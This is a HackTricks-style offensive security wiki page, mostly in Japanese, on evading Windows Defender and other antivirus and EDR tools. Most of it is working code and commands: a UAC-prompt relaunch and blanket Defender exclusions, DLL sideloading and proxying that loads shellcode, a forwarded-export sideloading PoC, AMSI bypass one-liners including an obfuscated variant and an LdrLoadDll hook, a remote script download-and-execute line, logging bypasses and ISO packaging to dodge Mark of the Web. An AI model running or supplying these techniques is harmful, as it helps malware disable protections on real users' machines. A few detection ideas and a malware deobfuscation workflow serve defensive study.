# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページは最初に執筆したのは** [**@m2rc_p**](https://twitter.com/m2rc_p)**です！**

## Defender を停止

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender の動作を停止させるツール。
- [no-defender](https://github.com/es3n1n/no-defender): 他の AV を偽装して Windows Defender の動作を停止させるツール。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Defender を操作する前のインストーラー風 UAC おとり

ゲームのチートを装った公開ローダーは、署名されていない Node.js/Nexe インストーラーとして配布されることが多く、最初に **ユーザーに権限昇格を要求** し、その後に Defender を無効化します。流れは単純です：

1. 管理コンテキストを `net session` で確認する。コマンドは呼び出し元が管理者権限を持つ場合にのみ成功するため、失敗はローダーが標準ユーザーとして実行されていることを示す。
2. 元のコマンドラインを保持したまま、期待される UAC 同意プロンプトを表示させるために `RunAs` verb で即座に自身を再起動する。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
被害者はすでに“cracked”ソフトをインストールしていると信じているため、プロンプトは通常承認され、malwareがDefenderのポリシーを変更するために必要な権限が与えられる。

### すべてのドライブ文字に対する包括的な `MpPreference` 除外

昇格に成功すると、GachiLoader-style chainsはサービスを完全に無効化する代わりにDefenderの盲点を最大化する。loaderはまずGUIの監視プロセスを停止（`taskkill /F /IM SecHealthUI.exe`）し、その後**極めて広範な除外**を適用して、すべてのユーザープロファイル、システムディレクトリ、およびリムーバブルディスクがスキャン不能になるようにする:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
主な観察点：

- ループはすべてのマウントされたファイルシステム（D:\、E:\、USB スティック等）を走査するため、**ディスク上のどこに置かれた将来的なペイロードも無視される**。
- `.sys` 拡張子の除外は将来を見越したもので、攻撃者は Defender を再度触らずに未署名ドライバを後でロードする選択肢を残している。
- すべての変更は `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` の下に格納されるため、後続段階で除外が存続しているか確認したり、UAC を再トリガーせずにそれらを拡張したりできる。

Defender のサービスは停止されないため、単純なヘルスチェックはリアルタイム検査がこれらのパスに一度も触れていなくても “antivirus active” と報告し続ける。

## **AV Evasion Methodology**

現状、AVs はファイルの悪性を判定するために static detection、dynamic analysis、およびより高度な EDRs では behavioural analysis といった異なる方法を使用する。

### **Static detection**

Static detection は、バイナリやスクリプト内の既知の悪意ある文字列やバイト列をフラグ付けしたり、ファイル自体から情報（例：ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）を抽出したりすることで実現される。これは既知の public tools を使うと検出されやすくなることを意味する。これを回避する方法はいくつかある：

- **Encryption**

バイナリを暗号化すれば AV にプログラムを検出される手段はなくなるが、メモリ上で復号して実行するためのローダーが必要になる。

- **Obfuscation**

バイナリやスクリプトの文字列をいくつか変更するだけで AV をすり抜けられることがあるが、何を難読化するかによっては時間のかかる作業になる。

- **Custom tooling**

自作ツールを開発すれば既知の悪性シグネチャは存在しないが、その分多大な時間と労力が必要となる。

> [!TIP]
> Windows Defender の static detection をチェックする良い方法は [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) である。ThreatCheck はファイルを複数のセグメントに分割して Defender にそれぞれ個別にスキャンさせることで、バイナリ内でどの文字列やバイトがフラグ付けされているかを正確に特定できる。

実践的な AV 回避については、この [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) を強くおすすめする。

### **Dynamic analysis**

Dynamic analysis は AV がバイナリをサンドボックスで実行し、悪意ある活動（例：ブラウザのパスワードの復号・読み取りを試みる、LSASS のミニダンプを取る、など）を監視する手法である。この部分は扱いがやや難しいが、サンドボックスを回避するためにできることがいくつかある。

- **Sleep before execution** 実装次第では、AV の dynamic analysis を回避する優れた方法になり得る。AV はユーザーのワークフローを妨げないよう短時間でスキャンを行うため、長いスリープを使うことでバイナリの解析を妨げられることがある。ただし、多くの AV のサンドボックスは実装に応じてそのスリープをスキップすることがある。
- **Checking machine's resources** 通常、サンドボックスは扱えるリソースが非常に限られている（例：< 2GB RAM）。さもなければユーザーのマシンを遅くしてしまうためである。ここでは創造的になれる。例えば CPU 温度やファン速度をチェックするなど、すべてがサンドボックスに実装されているわけではない。
- **Machine-specific checks** ターゲットのワークステーションが "contoso.local" ドメインに参加しているユーザを狙うなら、コンピュータのドメインが指定したものと一致するかを確認し、一致しなければプログラムを終了させることができる。

Microsoft Defender のサンドボックスのコンピュータ名は HAL9TH であることが分かっているため、実行前にコンピュータ名をチェックし、名前が HAL9TH に一致したら Defender のサンドボックス内と判断してプログラムを終了させることができる。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

サンドボックス対策についてのその他の有益なヒントは [@mgeeky](https://twitter.com/mariuszbit) が挙げている。

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

前述したように、**public tools** はいずれ **検出される**。ここで自問すべきことがある：

例えば LSASS をダンプしたいとき、**本当に mimikatz を使う必要があるか**？それとも LSASS をダンプできる、あまり知られていない別のプロジェクトを使えるか？

正解はおそらく後者だ。mimikatz は例を挙げれば、AVs や EDRs に最も多くフラグ付けされるツールの一つであり、プロジェクト自体は素晴らしいが、AV を回避するために扱うのは非常に面倒である。したがって、目的に応じた代替を探すべきだ。

> [!TIP]
> ペイロードを回避向けに修正する際は、defender の **自動サンプル送信をオフにする**ことを必ず行い、長期的に回避を目指すなら **絶対に VIRUSTOTAL にアップロードしないでください**。特定の AV による検出を確認したい場合は、VM にその AV を入れて自動サンプル送信をオフにし、満足する結果が得られるまでそこでテストすること。

## EXEs vs DLLs

可能な限り、回避のためには常に **DLLs を優先して使用する**べきだ。私の経験では、DLL ファイルは通常 **かなり検出されにくく**、分析もされにくいので、（ペイロードが DLL として実行できる手段を持っているなら）検出を避けるための非常に単純なトリックになる。

この画像が示すように、Havoc の DLL ペイロードは antiscan.me で 4/26 の検出率なのに対し、EXE ペイロードは 7/26 である。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

ここからは、DLL ファイルでよりステルスに振る舞うためのトリックをいくつか紹介する。

## DLL Sideloading & Proxying

**DLL Sideloading** はローダーの DLL 検索順を利用し、被害者アプリケーションと悪意あるペイロードを隣接させて配置することで成立する。

DLL Sideloading に脆弱なプログラムは [Siofra](https://github.com/Cybereason/siofra) と以下の powershell スクリプトを使って確認できる：
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは "C:\Program Files\\" 内で DLL hijacking の影響を受けやすいプログラムと、そのプログラムがロードしようとする DLL ファイルの一覧を出力します。

I highly recommend you **explore DLL Hijackable/Sideloadable programs yourself**, this technique is pretty stealthy done properly, but if you use publicly known DLL Sideloadable programs, you may get caught easily.

単にプログラムがロードすることを期待する名前の悪意ある DLL を置いただけでは、プログラムはその DLL 内に特定の関数を期待しているため、payload をロードしません。この問題を解決するために、**DLL Proxying/Forwarding** という別の手法を使います。

**DLL Proxying** forwards the calls a program makes from the proxy (and malicious) DLL to the original DLL, thus preserving the program's functionality and being able to handle the execution of your payload.

I will be using the [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project from [@flangvik](https://twitter.com/Flangvik/)

These are the steps I followed:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドは2つのファイルを生成します: DLLのソースコードテンプレートと、リネームされた元のDLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決される。

PoC (copy-paste):
1) 署名されたシステム DLL を書き込み可能なフォルダにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダに悪意のある `NCRYPTPROV.dll` を置きます。最小限の DllMain があればコード実行が可能です。DllMain をトリガーするためにフォワードされた関数を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 署名済みの LOLBin で forward をトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
- `KeyIsoSetAuditingInterface` を解決する際、ローダーはフォワード先の `NCRYPTPROV.SetAuditingInterface` をたどる
- その後、ローダーは `C:\test` から `NCRYPTPROV.dll` をロードし、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合、`DllMain` 実行後になって初めて「missing API」エラーが発生する

Hunting tips:
- ターゲットモジュールが KnownDLL でない forwarded exports に注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に列挙されている。
- 以下のようなツールで forwarded exports を列挙できる:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Windows 11 forwarder のインベントリを参照して候補を検索してください: https://hexacorn.com/d/apis_fwd.txt

検出・防御のアイデア:
- LOLBins（例: rundll32.exe）が非システムパスから署名付きDLLをロードし、そのディレクトリから同じベース名の非-KnownDLLs を続けてロードする挙動を監視する
- ユーザー書き込み可能なパス上で、`rundll32.exe` → 非システム `keyiso.dll` → `NCRYPTPROV.dll` のようなプロセス/モジュールチェーンでアラートを上げる
- コード整合性ポリシー（WDAC/AppLocker）を適用し、アプリケーションディレクトリでの書き込み＋実行を禁止する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze は suspended processes、direct syscalls、alternative execution methods を使用して EDRs をバイパスするための payload toolkit です`

Freeze を使って shellcode をステルスな方法でロードして実行できます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 回避はいたちごっこにすぎません。今日有効な手法が明日検出される可能性があるため、単一のツールのみに頼らないでください。可能であれば複数の回避手法をチェーンして使ってください。

## 直接／間接 Syscalls と SSN 解決 (SysWhispers4)

EDRs はしばしば `ntdll.dll` の syscall スタブに **user-mode inline hooks** を配置します。これらのフックを回避するには、正しい **SSN** (System Service Number) をロードし、フックされたエクスポートのエントリポイントを実行せずにカーネルモードへ移行する、**direct** または **indirect** の syscall スタブを生成できます。

**Invocation options:**
- **Direct (embedded)**: 生成されたスタブに `syscall`/`sysenter`/`SVC #0` 命令を埋め込みます（`ntdll` のエクスポートを呼び出さない）。
- **Indirect**: 既存の `ntdll` 内の `syscall` gadget にジャンプして、カーネルへの移行が `ntdll` 発のように見せかけます（ヒューリスティック回避に有用）。**randomized indirect** は呼び出しごとにプールから gadget を選びます。
- **Egg-hunt**: 静的に `0F 05` オペコードシーケンスをディスク上に埋め込むのを避け、実行時に syscall シーケンスを解決します。

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: スタブのバイトを読む代わりに仮想アドレスで syscall スタブをソートして SSN を推定します。
- **SyscallsFromDisk**: クリーンな `\KnownDlls\ntdll.dll` をマップし、その `.text` から SSN を読み取り、アンマップします（これにより全てのインメモリフックを回避）。
- **RecycledGate**: スタブがクリーンな場合は VA ソートによる SSN 推定とオペコード検証を組み合わせ、フックされている場合は VA 推定にフォールバックします。
- **HW Breakpoint**: `syscall` 命令に DR0 をセットし、VEH を使って実行時に `EAX` から SSN をキャプチャします（フックされたバイトを解析せずに）。

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI was created to prevent "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Initially, AVs were only capable of scanning **files on disk**, so if you could somehow execute payloads **directly in-memory**, the AV couldn't do anything to prevent it, as it didn't have enough visibility.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (EXE、COM、MSI、または ActiveX インストールの昇格)
- PowerShell（スクリプト、インタラクティブ使用、動的コード評価）
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

It allows antivirus solutions to inspect script behavior by exposing script contents in a form that is both unencrypted and unobfuscated.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Notice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe

We didn't drop any file to disk, but still got caught in-memory because of AMSI.

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

AMSI は主に静的検出で動作するため、ロードしようとするスクリプトを変更することで検出を回避できる場合があります。

しかし、AMSI は多層の難読化であってもスクリプトを元に戻す能力があるため、難読化は実装方法によっては有効でないことがあります。したがって回避は必ずしも簡単ではありません。とはいえ、場合によっては変数名を数個変更するだけで通ることもあるので、どれだけ検知されているかによります。

- **AMSI Bypass**

AMSI は powershell（および cscript.exe, wscript.exe など）のプロセスに DLL をロードすることで実装されているため、特権のないユーザとして実行していても比較的簡単に改変することが可能です。この実装上の欠陥により、研究者らは AMSI スキャンを回避する複数の手法を見つけています。

**Forcing an Error**

AMSI の初期化を失敗させる（amsiInitFailed）と、当該プロセスに対してスキャンが開始されなくなります。これは元々 [Matt Graeber](https://twitter.com/mattifestation) によって公開され、Microsoft はより広範な利用を防ぐためのシグネチャを作成しました。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
現在の powershell プロセスで AMSI を無効化するのに必要だったのは、powershell のコード1行だけだった。これはもちろん AMSI 自体によって検出されるため、この手法を使うにはいくつかの修正が必要だ。

以下は私がこの [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取ってきた修正済みの AMSI bypass だ。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

実装の概要 (x64 C/C++ 疑似コード):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
注意
- Works across PowerShell, WScript/CScript and custom loaders alike (anything that would otherwise load AMSI).
- 長いコマンドラインの痕跡を避けるため、スクリプトをstdin経由で渡す（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせて使ってください。
- LOLBins経由で実行されるローダー（例: `regsvr32` が `DllRegisterServer` を呼ぶケース）で使われるのが確認されています。

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**検出されたシグネチャを削除する**

現在のプロセスのメモリから検出されたAMSIシグネチャを削除するために、**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** のようなツールを使用できます。これらのツールは、現在のプロセスのメモリをスキャンしてAMSIシグネチャを検出し、それをNOP命令で上書きすることで実質的にメモリから除去します。

**AMSIを利用するAV/EDR製品**

AMSIを利用するAV/EDR製品の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**PowerShell version 2 を使用する**
PowerShell version 2 を使うと AMSI はロードされないため、スクリプトは AMSI によるスキャンを受けずに実行できます。次のように実行します：
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging は、システム上で実行されたすべての PowerShell コマンドをログに記録できる機能です。監査やトラブルシューティングに役立ちますが、検出を回避したい攻撃者にとっては **問題になることがあります**。

PowerShell logging をバイパスするには、次の手法を使用できます:

- **Disable PowerShell Transcription and Module Logging**: この目的には [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のようなツールを使用できます。
- **Use Powershell version 2**: PowerShell version 2 を使用すると AMSI はロードされないため、スクリプトを AMSI によるスキャンなしで実行できます。次のように実行します: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: 防御のない PowerShell を生成するには [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使用してください（これは `powerpick` from Cobal Strike が使う方法です）。


## Obfuscation

> [!TIP]
> いくつかの難読化技法はデータの暗号化に依存しており、これによりバイナリの entropy が上がり、AVs や EDRs に検出されやすくなります。この点には注意し、暗号化は機密性の高い部分や隠す必要がある特定セクションにのみ適用することを検討してください。

### ConfuserEx で保護された .NET バイナリの逆難読化

ConfuserEx 2（または商用フォーク）を使用したマルウェアを解析する際、デコンパイラやサンドボックスを阻害する複数の保護層に直面するのは一般的です。以下のワークフローは、後で dnSpy や ILSpy などのツールで C# にデコンパイルできる、ほぼ元の IL を確実に復元します。

1.  アンチタンパリングの除去 – ConfuserEx はすべての *method body* を暗号化し、*module* の static コンストラクタ (`<Module>.cctor`) 内で復号します。これにより PE チェックサムもパッチされるため、改変するとバイナリがクラッシュします。暗号化されたメタデータテーブルを特定し、XOR キーを復元してクリーンなアセンブリを書き直すには **AntiTamperKiller** を使用します:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
出力には 6 つのアンチタンパリングパラメータ（`key0-key3`, `nameHash`, `internKey`）が含まれており、独自のアンパッカー作成時に役立ちます。

2.  シンボル／制御フローの復元 – *clean* ファイルを **de4dot-cex**（ConfuserEx 対応の de4dot フォーク）に渡します。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
フラグ:
• `-p crx` – ConfuserEx 2 プロファイルを選択  
• de4dot は control-flow flattening を元に戻し、元の namespaces、classes、variable names を復元し、定数文字列を復号します。

3.  プロキシコールの除去 – ConfuserEx は decompilation をさらに阻害するため、直接のメソッド呼び出しを軽量なラッパー（いわゆる *proxy calls*）に置き換えます。これらは **ProxyCall-Remover** で削除します:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
このステップの後は、不透明なラッパー関数（`Class8.smethod_10` など）の代わりに `Convert.FromBase64String` や `AES.Create()` のような通常の .NET API が見えるはずです。

4.  手動でのクリーンアップ – 得られたバイナリを dnSpy で開き、大きな Base64 ブロブや `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用を検索して *実際の* ペイロードを特定します。多くの場合、マルウェアはそれを `<Module>.byte_0` 内で初期化された TLV-encoded バイト配列として格納しています。

上記のチェーンはマルウェアサンプルを実行することなく実行フローを復元します。オフラインワークステーションで作業する際に有用です。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。これはサンプルを自動的にトリアージするための IOC として利用できます。

#### ワンライナー
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# 用オブフスケータ**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) コンパイルスイートのオープンソースフォークを提供し、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) と改ざん防止を通じてソフトウェアのセキュリティを向上させることです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator は `C++11/14` 言語を使って、外部ツールやコンパイラの変更を用いずにコンパイル時に難読化されたコードを生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming フレームワークで生成される難読化操作のレイヤーを追加し、アプリケーションを解析しようとする人の作業をより困難にします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz は x64 バイナリオブフスケータで、.exe、.dll、.sys を含むさまざまな PE ファイルを難読化できます。
- [**metame**](https://github.com/a0rtega/metame): Metame は任意の実行ファイル向けのシンプルな metamorphic code エンジンです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator は ROP (return-oriented programming) を用いる LLVM 対応言語向けの細粒度コード難読化フレームワークです。ROPfuscator は通常の命令を ROP チェーンに変換してアセンブリレベルでプログラムを難読化し、通常の制御フローの把握を困難にします。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt は Nim で書かれた .NET PE Crypter です。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor は既存の EXE/DLL を shellcode に変換してロードすることができます。

## SmartScreen & MoTW

インターネットからダウンロードした実行ファイルを実行するときに、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreen は、潜在的に悪意のあるアプリケーションの実行からエンドユーザを保護することを目的としたセキュリティ機構です。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen は主にレピュテーションベースのアプローチで動作します。つまり、あまりダウンロードされていないアプリケーションは SmartScreen をトリガーし、エンドユーザに警告を出してファイルの実行を防ぎます（ただしファイルは More Info -> Run anyway をクリックすることで実行可能です）。

**MoTW** (Mark of The Web) は Zone.Identifier という名前の [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) で、インターネットからファイルをダウンロードした際に、そのダウンロード元の URL と共に自動的に作成されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルの Zone.Identifier ADS を確認しているところ。</p></figcaption></figure>

> [!TIP]
> 署名された **trusted** な signing certificate を持つ実行ファイルは **SmartScreen をトリガーしない** ことに注意してください。

ペイロードが Mark of The Web を付与されるのを防ぐ非常に有効な方法は、ISO のようなコンテナにパッケージングすることです。これは Mark-of-the-Web (MOTW) が **非 NTFS** ボリュームには適用できないためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) は、ペイロードを出力コンテナにパッケージして Mark-of-the-Web を回避するツールです。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、アプリケーションやシステムコンポーネントがイベントをログできる強力な Windows のロギング機構です。しかし同時に、セキュリティ製品が悪意ある活動を監視・検出するためにも利用されます。

